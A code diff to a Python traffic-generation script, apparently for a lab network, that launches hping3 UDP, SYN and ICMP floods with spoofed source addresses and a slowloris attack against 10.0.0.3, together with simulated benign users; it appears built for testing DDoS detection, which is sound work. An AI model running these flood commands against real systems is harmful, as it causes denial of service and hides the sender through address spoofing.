@@ -32,6 +32,7 @@ import argparse
 TARGET_IP = "10.0.0.3"
 SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))
 active_processes = []
+SUDO_PREFIX = [] if os.geteuid() == 0 else ["sudo"]
 
 def cleanup(signum=None, frame=None):
     print("\n[*] Stopping all dynamic traffic generators...")
@@ -44,8 +45,8 @@ def cleanup(signum=None, frame=None):
                 p.kill()
             except Exception:
                 pass
-    subprocess.run(["sudo", "pkill", "-f", "hping3"], stderr=subprocess.DEVNULL)
-    subprocess.run(["sudo", "pkill", "-f", "slowloris.py"], stderr=subprocess.DEVNULL)
+    subprocess.run(SUDO_PREFIX + ["pkill", "-9", "-f", "hping3"], stderr=subprocess.DEVNULL)
+    subprocess.run(SUDO_PREFIX + ["pkill", "-9", "-f", "slowloris.py"], stderr=subprocess.DEVNULL)
     print("[+] All traffic generators stopped cleanly.")
     sys.exit(0)
 
@@ -62,9 +63,9 @@ def spawn_legitimate_users():
     print("    • User 2 (10.0.0.11) -> 10.0.0.3:80   [HTTP Web Client]   (~250 pkts/s)")
     print("    • User 3 (10.0.0.12) -> 10.0.0.3:53   [DNS/API Queries]   (~200 pkts/s)")
 
-    cmd1 = ["sudo", "hping3", "-a", "10.0.0.1", "--udp", "-p", "5001", "-i", "u1250", TARGET_IP]
-    cmd2 = ["sudo", "hping3", "-a", "10.0.0.11", "--udp", "-p", "80", "-i", "u4000", TARGET_IP]
-    cmd3 = ["sudo", "hping3", "-a", "10.0.0.12", "--udp", "-p", "53", "-i", "u5000", TARGET_IP]
+    cmd1 = SUDO_PREFIX + ["hping3", "-a", "10.0.0.1", "--udp", "-p", "5001", "-i", "u1250", TARGET_IP]
+    cmd2 = SUDO_PREFIX + ["hping3", "-a", "10.0.0.11", "--udp", "-p", "80", "-i", "u4000", TARGET_IP]
+    cmd3 = SUDO_PREFIX + ["hping3", "-a", "10.0.0.12", "--udp", "-p", "53", "-i", "u5000", TARGET_IP]
 
     for cmd in (cmd1, cmd2, cmd3):
         p = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
@@ -78,13 +79,13 @@ def spawn_attackers(mode="botnet"):
     """
     if mode == "volumetric":
         print("[!] Launching single volumetric UDP flood from 10.0.0.2 (h2)...")
-        p = subprocess.Popen(["sudo", "hping3", "--flood", "--udp", "-p", "80", TARGET_IP],
+        p = subprocess.Popen(SUDO_PREFIX + ["hping3", "--flood", "--udp", "-p", "80", TARGET_IP],
                              stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
         active_processes.append(p)
 
     elif mode == "syn_flood":
         print("[!] Launching TCP SYN handshake flood from 10.0.0.4 (h4)...")
-        p = subprocess.Popen(["sudo", "hping3", "-a", "10.0.0.4", "--flood", "-S", "-p", "80", TARGET_IP],
+        p = subprocess.Popen(SUDO_PREFIX + ["hping3", "-a", "10.0.0.4", "--flood", "-S", "-p", "80", TARGET_IP],
                              stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
         active_processes.append(p)
 
@@ -105,11 +106,11 @@ def spawn_attackers(mode="botnet"):
         print("    -> Attacker 6 (10.0.0.8): DNS Port UDP Flood (port 53)")
 
         cmds = [
-            ["sudo", "hping3", "-a", "10.0.0.2", "--flood", "--udp", "-p", "80", TARGET_IP],
-            ["sudo", "hping3", "-a", "10.0.0.4", "--flood", "-S", "-p", "80", TARGET_IP],
-            ["sudo", "hping3", "-a", "10.0.0.6", "--flood", "--icmp", TARGET_IP],
-            ["sudo", "hping3", "-a", "10.0.0.7", "--flood", "--udp", "-p", "8080", TARGET_IP],
-            ["sudo", "hping3", "-a", "10.0.0.8", "--flood", "--udp", "-p", "53", TARGET_IP],
+            SUDO_PREFIX + ["hping3", "-a", "10.0.0.2", "-i", "u100", "--udp", "-p", "80", TARGET_IP],
+            SUDO_PREFIX + ["hping3", "-a", "10.0.0.4", "-i", "u100", "-S", "-p", "80", TARGET_IP],
+            SUDO_PREFIX + ["hping3", "-a", "10.0.0.6", "-i", "u100", "--icmp", TARGET_IP],
+            SUDO_PREFIX + ["hping3", "-a", "10.0.0.7", "-i", "u100", "--udp", "-p", "8080", TARGET_IP],
+            SUDO_PREFIX + ["hping3", "-a", "10.0.0.8", "-i", "u100", "--udp", "-p", "53", TARGET_IP],
             ["python3", os.path.join(SCRIPT_DIR, "slowloris.py"), TARGET_IP, "80", "80"],
         ]
         for cmd in cmds:
